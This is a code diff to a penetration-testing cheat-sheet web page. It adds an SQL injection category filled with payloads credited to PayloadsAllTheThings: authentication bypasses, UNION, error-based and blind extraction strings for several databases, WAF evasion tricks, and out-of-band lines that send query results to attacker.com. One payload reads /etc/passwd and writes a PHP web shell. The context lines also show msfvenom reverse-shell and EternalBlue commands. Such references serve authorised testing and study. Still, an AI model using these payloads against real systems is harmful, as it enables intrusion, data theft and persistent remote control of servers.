@@ -239,7 +239,7 @@
                     <button class="cat-pill active" onclick="setCategory('all')">All</button>
                     <button class="cat-pill" onclick="setCategory('recon')">Recon & OSINT</button>
                     <button class="cat-pill" onclick="setCategory('web')">Web App Testing</button>
-                    <button class="cat-pill" onclick="setCategory('exploit')">Exploitation</button>
+                    <button class="cat-pill" onclick="setCategory('sqli')">SQL Injection</button> <button class="cat-pill" onclick="setCategory('exploit')">Exploitation</button>
                     <button class="cat-pill" onclick="setCategory('password')">Password Attacks</button>
                     <button class="cat-pill" onclick="setCategory('wireless')">Wireless</button>
                     <button class="cat-pill" onclick="setCategory('postexploit')">Post-Exploitation</button>
@@ -332,6 +332,30 @@
             { cat: "web", name: "burpsuite", desc: "Full web app security testing platform (GUI).", usage: "# Launch GUI\nburpsuite\n# Set browser proxy to 127.0.0.1:8080" },
             { cat: "web", name: "curl", desc: "HTTP client for manual request crafting and testing.", usage: "curl -X POST http://target.com/login -d \"user=admin&pass=x\" -v\ncurl -H \"Authorization: Bearer TOKEN\" https://api.target.com/admin" },
             { cat: "web", name: "xsstrike", desc: "Advanced XSS detection and exploitation.", usage: "python3 xsstrike.py -u \"http://site.com/search?q=test\"\npython3 xsstrike.py -u \"http://site.com/\" --crawl" },
+
+            // ---> BEGIN ADDED PAYLOADSALLTHETHINGS SQL INJECTION DATA
+            { cat: "sqli", name: "Auth Bypass (Generic)", desc: "Basic authentication bypass payloads.", usage: "admin' or '1'='1\nadmin' --\nadmin' #\n' OR 1=1--" },
+            { cat: "sqli", name: "Auth Bypass (Logic)", desc: "Advanced logic bypasses.", usage: "' OR '1'\n' OR 1 -- -\n\" OR \"\" = \"\n'=' '\n' LIKE '\n'=0--+" },
+            { cat: "sqli", name: "Union Based (MySQL)", desc: "Extract data using UNION in MySQL.", usage: "' UNION SELECT 1,2,3-- -\n' UNION SELECT 1,version(),database()-- -\n' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -" },
+            { cat: "sqli", name: "Union Based (MSSQL)", desc: "Extract data using UNION in MSSQL.", usage: "' UNION SELECT 1,2,3--\n' UNION SELECT 1,@@version,3--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables--" },
+            { cat: "sqli", name: "Union Based (PostgreSQL)", desc: "Extract data using UNION in PostgreSQL.", usage: "' UNION SELECT NULL,NULL,NULL--\n' UNION SELECT 1,version(),current_database()--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='public'--" },
+            { cat: "sqli", name: "Union Based (Oracle)", desc: "Extract data using UNION in Oracle (requires FROM dual).", usage: "' UNION SELECT NULL,NULL FROM dual--\n' UNION SELECT 1,banner FROM v$version--\n' UNION SELECT 1,table_name FROM all_tables--" },
+            { cat: "sqli", name: "Error Based (MySQL)", desc: "Extract data via XML/floor errors in MySQL.", usage: "' AND extractvalue(rand(),concat(0x3a,version()))-- -\n' AND updatexml(rand(),concat(0x3a,version()),null)-- -\n' OR 1 GROUP BY concat_ws(0x3a,version(),floor(rand(0)*2)) HAVING min(0)-- -" },
+            { cat: "sqli", name: "Error Based (MSSQL)", desc: "Extract data via conversion errors in MSSQL.", usage: "' AND 1=CONVERT(int,(SELECT @@version))--\n' AND 1=(SELECT db_name())--" },
+            { cat: "sqli", name: "Error Based (PostgreSQL)", desc: "Extract data via casting errors in PostgreSQL.", usage: "' AND 1=CAST((SELECT version()) AS int)--\n' AND 1=CAST((SELECT current_database()) AS int)--" },
+            { cat: "sqli", name: "Blind Boolean (Generic)", desc: "Infer data via true/false page responses.", usage: "' AND 1=1-- -\n' AND 1=2-- -\n' AND (SELECT count(*) FROM users) > 0-- -" },
+            { cat: "sqli", name: "Blind Boolean (MySQL)", desc: "Extract specific characters in MySQL.", usage: "' AND SUBSTRING(version(),1,1)='5'-- -\n' AND ASCII(SUBSTRING(database(),1,1))=115-- -\n' AND LENGTH(database())=4-- -" },
+            { cat: "sqli", name: "Blind Boolean (PostgreSQL)", desc: "Extract specific characters in PostgreSQL.", usage: "' AND SUBSTRING(version(),1,1)='P'--\n' AND ASCII(SUBSTRING(current_database(),1,1))=115--" },
+            { cat: "sqli", name: "Blind Time (MySQL)", desc: "Infer data via time delays (SLEEP).", usage: "' AND SLEEP(5)-- -\n' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)-- -" },
+            { cat: "sqli", name: "Blind Time (MSSQL)", desc: "Infer data via time delays (WAITFOR).", usage: "'; WAITFOR DELAY '0:0:5'--\n'; IF (SYSTEM_USER='sa') WAITFOR DELAY '0:0:5'--" },
+            { cat: "sqli", name: "Blind Time (PostgreSQL)", desc: "Infer data via time delays (pg_sleep).", usage: "' AND 1=(SELECT 1 FROM pg_sleep(5))--\n'||pg_sleep(5)--\n' AND (CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END)--" },
+            { cat: "sqli", name: "OOB / DNS (MySQL)", desc: "Out-of-band extraction via DNS.", usage: "SELECT load_file(concat('\\\\',(select version()),'.attacker.com\\a.txt'))" },
+            { cat: "sqli", name: "OOB / DNS (MSSQL)", desc: "Out-of-band extraction via SMB/DNS in MSSQL.", usage: "EXEC master..xp_dirtree '\\\\attacker.com\\payload'--\nEXEC master..xp_fileexist '\\\\attacker.com\\payload'--" },
+            { cat: "sqli", name: "WAF Bypass (Comments)", desc: "Bypass simple WAF filters using inline comments.", usage: "uNiOn SeLeCt 1,2,3-- -\n/*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -\n/*!UNION*/ /*!SELECT*/ 1,2,3-- -" },
+            { cat: "sqli", name: "WAF Bypass (Encoding)", desc: "Bypass WAF using URL or Hex encoding.", usage: "%55nion %53elect 1,2,3-- -\n%2555nion %2553elect 1,2,3-- -\nSELECT 0x50617373776f7264" },
+            { cat: "sqli", name: "Filter Bypass (No Spaces)", desc: "Inject without using space characters.", usage: "'/**/UNION/**/SELECT/**/1,2,3--\n'()UNION()SELECT()1,2,3--\n'%%0AUNION%%0ASELECT%%0A1,2,3--" },
+            { cat: "sqli", name: "Read/Write Files (MySQL)", desc: "Read internal files or write webshells (requires FILE privs).", usage: "' UNION SELECT 1,load_file('/etc/passwd'),3-- -\n' UNION SELECT 1,'<?php system($_GET[\"c\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -" },
+            // <--- END ADDED PAYLOADSALLTHETHINGS SQL INJECTION DATA
 
             { cat: "exploit", name: "metasploit (msfconsole)", desc: "World's most used penetration testing framework.", usage: "msfconsole\nsearch type:exploit name:eternalblue\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS [ip]\nrun" },
             { cat: "exploit", name: "msfvenom", desc: "Payload generator and encoder.", usage: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell" },
